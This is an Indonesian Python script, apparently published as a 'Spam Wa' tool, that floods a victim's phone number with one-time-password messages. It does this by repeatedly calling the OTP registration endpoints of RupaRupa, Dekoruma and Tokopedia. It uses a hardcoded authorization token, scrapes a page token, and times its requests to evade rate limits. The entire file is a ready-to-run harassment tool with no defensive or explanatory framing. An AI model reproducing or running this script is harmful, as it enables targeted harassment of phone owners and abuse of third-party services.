import requests, json, time, re
ua = 'Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 GSA/10.16.6.21.arm64'
r = requests.Session()
class gaguna:
 def tunggu(t):
  while t:
   wd=f'\r{w.i}----> [{w.m}#{w.i}] {w.h}Jeda selama {w.i}({w.p}'+str(t)+f'{w.i}) {w.h}detik '
   print(wd,end='\r',flush=True)
   time.sleep(1)
   t -= 1
class w:
 m = '\033[1;31m' # merah
 b = '\033[1;36m' # biru
 k = '\033[1;33m' # kuning
 h = '\033[1;32m' # hijau
 u = '\033[1;35m' # ungu
 p = '\033[1;37m' # putih
 i = '\033[1;90m' # abu abu
 ut = '\033[1;34m' # ungu tua
 tm = '\x1b[103m\x1b[31m' # tebal merah (background kuning)
 df = '\x1b[0m'
 c = '\033[1;96m' # cyan
class main:
 def banner():
     print (f"""{w.c}  ______                           ____      ____      
{w.k}.' ____ \                         |_  _|    |_  _|     
{w.c}| (___ \_|_ .--.   ,--.   _ .--..--.\ \  /\  / /,--.   
{w.k} _.____`.[ '/'`\ \`'_\ : [ `.-. .-. |\ \/  \/ /`'_\ :  
{w.c}| \____) || \__/ |// | |, | | | | | | \  /\  / // | |, 
{w.k} \______.'| ;.__/ \'-;__/[___||__||__] \/  \/  \'-;__/ 
{w.c}         [__|                                          """)
 def subbanner():
     print (f"""{w.i}[{w.k}-{w.i}] {w.k}Author {w.i}: {w.h}abilseno11
{w.i}[{w.k}-{w.i}] {w.k}Nama SC {w.i}: {w.h}Script Spam Wa
{w.i}[{w.k}-{w.i}] {w.k}Github {w.i}: {w.h}https://github.com/AbilSeno
{w.i}[{w.k}-{w.i}] {w.k}Pesan {w.i}: {w.h}Sementara gunakan spam dekoruma terlebih dahulu""")
 def start():
     pilih = input(f'{w.i}--> {w.i}[{w.m}-{w.i}] {w.k}Massukan pilihan : ')
     if (pilih == '1') or (pilih == '01'):
      main.ruparupa()
     elif (pilih == '2') or (pilih == '02'):
      main.dekoruma()
     elif (pilih == '3') or (pilih == '03'):
      main.tokopedia()
     else:
      print (f"{w.i}--> {w.i}[{w.m}-{w.i}] {w.m}Massukan pilihan dengan benar")
      main.start()
 def pilihan():
     print (f"""{w.i}[{w.c}01{w.i}] {w.h}Spam RupaRupa {w.i}({w.k}limit:1x30mnt{w.i})
{w.i}[{w.c}02{w.i}] {w.h}Spam Dekoruma {w.i}({w.k}limit:5x24jam{w.i})
{w.i}[{w.c}03{w.i}] {w.h}Spam Tokopedia {w.i}({w.k}limit:3x1jam{w.i})""")
 def ruparupa():
     nom = input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan nomor target (contoh:888xx) : ')
     if len(nom) < 5:
      print (f"{w.i}----> {w.i}[{w.m}-{w.i}] {w.m}Massukan nomor dengan benar!!!")
      main.dekoruma()
     else:
      jum = int(input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Massukan jumlah spam (ex:5) : '))
      class data:
       ruparupa1 = json.dumps({"phone":"0"+nom,"email":"abilseno11@gmail.com","action":"register","password":""})
       ruparupa2 = json.dumps({"phone":"0"+nom,"action":"register","channel":"chat","email":"","customer_id":"0","is_resend":0})
      for spam in range(jum):
         rupa1 = r.post(url.ruparupa1,headers=hd.ruparupa1,data=data.ruparupa1).text
         rupa2 = r.post(url.ruparupa2,headers=hd.ruparupa2,data=data.ruparupa2).text
         if 'error' in rupa2:
          print (f"{w.i}----> [{w.m}GAGAL{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
         else:
          print (f"{w.i}----> [{w.h}SUKSES{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
          gaguna.tunggu(60)
 def dekoruma():
      nom = input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan nomor target (contoh:888xx) : ')
      if len(nom) < 5:
       print (f"{w.i}----> {w.i}[{w.m}-{w.i}] {w.m}Massukan nomor dengan benar!!!")
       main.dekoruma()
      else:
       jum = int(input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan jumlah spam (ex:5) : '))
       class data:
        dekoruma = json.dumps({"phoneNumber":"+62"+nom,"platform":"wa"})
       for spam in range(jum):
        deko = r.post(url.dekoruma,headers=hd.dekoruma,data=data.dekoruma).text
        if '' in deko:
         print (f"{w.i}----> [{w.h}SUKSES{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
         gaguna.tunggu(60)
        else:
         print (f"{w.i}----> [{w.m}GAGAL{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
         gaguna.tunggu(60)
 def tokopedia():
      nom = input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan nomor target (contoh:888xx) : ')
      if len(nom) < 5:
       print (f"{w.i}----> {w.i}[{w.m}-{w.i}] {w.m}Massukan nomor dengan benar!!!")
       main.tokopedia()
      else:
       jum = int(input(f'{w.i}----> {w.i}[{w.m}-{w.i}] {w.k}Masukkan jumlah spam (ex:5) : '))
       u = r.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+nom+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D',headers=hd.tokopedia).text
       tokentokped = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', u).group(1)
       data = {"otp_type" : "116",
                    "msisdn" : nom,
                    "tk" : tokentokped,
                    "email" : "",
                    "original_param" : "",
                    "user_id" : "",
                    "signature" : "",
                    "number_otp_digit" : "6"}
       hay = requests.post("https://accounts.tokopedia.com/otp/c/ajax/request-wa",headers=hd.tokopedia,data=data).text
       if 'Anda sudah melakukan 3 kali pengiriman kode' in hay:
        print (f"{w.i}----> [{w.k}LIMIT{w.i}] {w.c}Kamu sudah melewati batas limit, coba lagi nanti!!!")
        exit()
       elif 'perbaikan' in hay:
        print (f"{w.i}----> [{w.m}ERROR{w.i}] {w.c}Server sedang dalam perbaikan!!!")
       else:
        print (f"{w.i}----> [{w.h}SUKSES{w.i}] {w.c}mengirim spam ke no {w.i}({w.u}{nom}{w.i})")
        gaguna.tunggu(60)
class url:
 ruparupa1 = 'https://wapi.ruparupa.com/auth/check-otp-auth'
 ruparupa2 = 'https://wapi.ruparupa.com/auth/generate-otp'
 dekoruma = 'https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json'
 tokopedia = 'https://accounts.tokopedia.com/otp/c/ajax/request-wa'
class hd:
 ruparupa1 = {
 'accept': 'application/json',
 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
 'content-length': '88',
 'content-type': 'application/json',                                                                                                          'origin': 'https://m.ruparupa.com',
 'referer': 'https://m.ruparupa.com/my-account',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-site',
 'user-agent': ua,
 'user-platform': 'mobile',
 'x-company-name': 'odi',                                                                                                                     'x-frontend-type': 'mobile',
}
 ruparupa2 = {
 'accept': 'application/json',
 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
 'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
 'content-length': '103',
 'content-type': 'application/json',
 'origin': 'https://ruparupa.com',
 'referer': 'https://ruparupa.com/verification?page=otp-choices',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-site',
 'user-agent': ua,
 'user-platform': 'mobile',
 'x-company-name': 'odi',
 'x-frontend-type': 'mobile',
}
 dekoruma = {"content-type": "application/json","user-agent":ua}
 tokopedia = {
'User-Agent' : ua,
'Accept-Encoding' : 'gzip, deflate',
'Connection' : 'keep-alive',
'Origin' : 'https://accounts.tokopedia.com',
'Accept' : 'application/json, text/javascript, */*; q=0.01',
'X-Requested-With' : 'XMLHttpRequest',
'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
}
if __name__ == '__main__':
 main.banner()
 main.subbanner()
 print (f"           {w.tm}MENU{w.df}       ")
 main.pilihan()
 main.start()
